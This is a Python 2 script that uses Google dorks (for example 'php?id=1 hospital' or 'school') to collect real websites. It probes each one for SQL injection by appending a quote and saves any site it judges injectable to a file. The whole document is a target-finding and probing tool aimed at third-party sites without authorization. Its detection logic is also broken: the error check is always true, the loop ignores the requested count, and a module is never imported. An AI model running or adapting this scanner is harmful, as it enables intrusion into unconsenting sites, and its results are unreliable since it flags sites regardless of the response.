import time
import os
import urllib2 
from googlesearch import search
import ssl

print'''  ---this script scans multiple google websites according to provided dork and returns if they are vulnerable or not by checking their error messages'''


print '''Different google docks that can be used to scan for websites are :
      1)  php?id=1                    7) php?id=1  pakistan
      2)  php?id=2                    8) php?id=1 hospital
      3)  php?id=5                    9) php?id=10   
      4)  php?id=1 india             10) php?id=1 school
      5)  php?id=3 hotel             11) php?id=1 china
      6)  php?id=10 college          12) php?id=1 login '''

print ''' These are some useful google dorks that can be applied. Nonetheless,user specific dorks are also accepted. Just make sure they are specific types for simple sql injection using dork'''
dork_list=['php?id=1','php?id=2','php?id=5','php?id=1 india','php?id=3 hotel','php?id=10 college','php?id=1 pakistan','php?id=1 hospital','php?id=100','php?id=1 school','php?id=1 china','php?id=1 login']
lis=[]
query=''
option=raw_input('Provide custom list(c) or use above dork(a):')
if option.lower() =="c":
  query=raw_input('Enter your custom dork:')
elif option.lower() =="a":
  value=int(raw_input('Enter respective dork number from above:'))
  query=dork_list[value-1]
else:
  print'Bad input!! quiting-'
  exit()
num_sites=input("enter number of websites to search:")
print'indexing all websites with specified dorks"'
for url in search(query, tld='es', lang='es', stop=int(num_sites)):
     time.sleep(2)
     print(url)
     lis.append(url)

if hasattr(ssl, '_create_unverified_context'):
 ssl._create_default_https_context = ssl._create_unverified_context

for k in range(0,19):
 print lis[k]
 time.sleep(1)
 context = ssl._create_unverified_context()
 try:
    response = urllib2.urlopen(lis[k]+"'")
 except urllib2.HTTPError, e:
    print'HTTPError = ' + str(e.code)
    continue
 except urllib2.URLError, e:
    print'URLError = ' + str(e.reason)
    continue
 except httplib.HTTPException, e:
    print'HTTPException'
    continue
 except Exception:
    import traceback
    print 'generic exception: ' + traceback.format_exc()
    continue
 page_source = response.read()
 if "error"or"SQL syntax"or "MYSQL" in page_source:
     print"----------------*****************************----------------"
     print "SQL InJECtable!!!"
     print '___ _____________'
     f=open('sites.txt','w')
     f.write(lis[k])
 else:
      print "Not vulnerable.."

   
